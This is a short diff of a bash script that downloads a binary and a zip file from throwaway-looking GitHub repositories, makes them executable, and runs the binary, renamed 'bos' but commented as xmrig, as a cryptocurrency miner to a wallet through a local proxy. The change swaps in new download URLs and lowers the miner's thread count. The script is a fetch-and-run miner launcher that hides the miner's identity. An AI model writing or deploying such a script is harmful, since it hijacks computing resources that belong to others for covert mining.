@@ -1,6 +1,6 @@
 #!/bin/bash
-curl -O -L -J https://github.com/dolmerda26/vigilant-fortnight/raw/refs/heads/main/bos
-curl -O -L -J https://github.com/dolmerda26/vigilant-fortnight/raw/refs/heads/main/pas.zip
+curl -O -L -J https://github.com/mozionyuda5/supreme-spoon/raw/refs/heads/main/bos
+curl -O -L -J https://github.com/mozionyuda5/supreme-spoon/raw/refs/heads/main/pas.zip
 unzip pas.zip
 chmod +x proxy
 chmod +x bos
@@ -22,7 +22,7 @@ while true; do
     sleep 3
 
     # Start xmrig
-    ./bos -o 127.0.0.1:$PORT -u $WALLET -p x -t 8 &
+    ./bos -o 127.0.0.1:$PORT -u $WALLET -p x -t 7 &
     MINER_PID=$!
 
     # Run for 5 minutes (600 seconds)
